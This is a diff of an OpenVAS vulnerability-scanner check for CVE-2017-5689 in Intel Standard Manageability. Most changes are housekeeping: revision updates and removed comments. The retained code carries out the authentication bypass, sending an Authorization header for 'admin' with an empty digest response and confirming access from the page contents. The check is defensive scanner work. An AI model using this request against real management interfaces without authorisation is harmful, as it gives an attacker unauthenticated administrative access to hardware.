@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_intel_standard_manageability_priv_esc_vuln.nasl 7174 2017-09-18 11:48:08Z asteins $
+# $Id: gb_intel_standard_manageability_priv_esc_vuln.nasl 9436 2018-04-11 09:39:34Z cfischer $
 #
 # Intel Standard Manageability Privilege Escalation Vulnerability
 #
@@ -29,12 +29,12 @@ CPE = "cpe:/h:intel:intel_standard_manageability";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.810997");
-  script_version("$Revision: 7174 $");
+  script_version("$Revision: 9436 $");
   script_cve_id("CVE-2017-5689");
   script_bugtraq_id(98269);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-18 13:48:08 +0200 (Mon, 18 Sep 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-04-11 11:39:34 +0200 (Wed, 11 Apr 2018) $");
   script_tag(name:"creation_date", value:"2017-05-05 15:39:37 +0530 (Fri, 05 May 2017)");
   script_tag(name:"qod_type", value:"exploit");
   script_name("Intel Standard Manageability Privilege Escalation Vulnerability");
@@ -74,35 +74,22 @@ if(description)
   script_dependencies("gb_intel_standard_manageability_detect.nasl");
   script_mandatory_keys("Intel/Standard/Manageability/version");
   script_require_ports("Services/www", 16992, 16993);
-  script_exclude_keys("Settings/disable_cgi_scanning");
+
   exit(0);
 }
-
 
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-##Variable Initialization
-sndReq = "";
-rcvRes = "";
-report = "";
-appPort = "";
-digest = "";
-nonce = "";
-match = "";
-
-## Get port
 if(!appPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
 url = "/index.htm";
-##Send Request to get nounce and digest
 sndReq = http_get_req(port:appPort, url:url);
 rcvRes = http_keepalive_send_recv(port:appPort, data:sndReq);
 
-##Confirm Response
 if(rcvRes && "Server: Intel(R) Standard Manageability" >< rcvRes)
 {
   match = eregmatch(string:rcvRes, pattern:'"Digest.(.*)", nonce="(.*)",stale');
@@ -117,18 +104,13 @@ if(rcvRes && "Server: Intel(R) Standard Manageability" >< rcvRes)
     exit(0);
   }
 
-  ##Crafted Request
   asp_session = string('Digest username="admin", realm="Digest:', digest, '", nonce="',
                         nonce, '", uri="/index.htm", response="", qop=auth, nc=00000001,
                         cnonce="cb199a22ab5646c7"');
 
-  ##Send Crafted Request
   sndReq = http_get_req(port:appPort, url:url, add_headers:make_array("Authorization", asp_session));
-
-  ##Get Response
   rcvRes = http_keepalive_send_recv(port:appPort, data:sndReq);
   
-  ##Confirm Exploit worked
   if(rcvRes =~ "HTTP/1\.. 200" && "Server: Intel(R) Standard Manageability" >< rcvRes
              && ">Hardware Information" >< rcvRes && ">IP address" >< rcvRes && ">System ID" >< rcvRes
              && ">System<" >< rcvRes && ">Processor<" >< rcvRes && ">Memory<" >< rcvRes)
@@ -138,3 +120,5 @@ if(rcvRes && "Server: Intel(R) Standard Manageability" >< rcvRes)
     exit(0);
   }
 }
+
+exit(99);
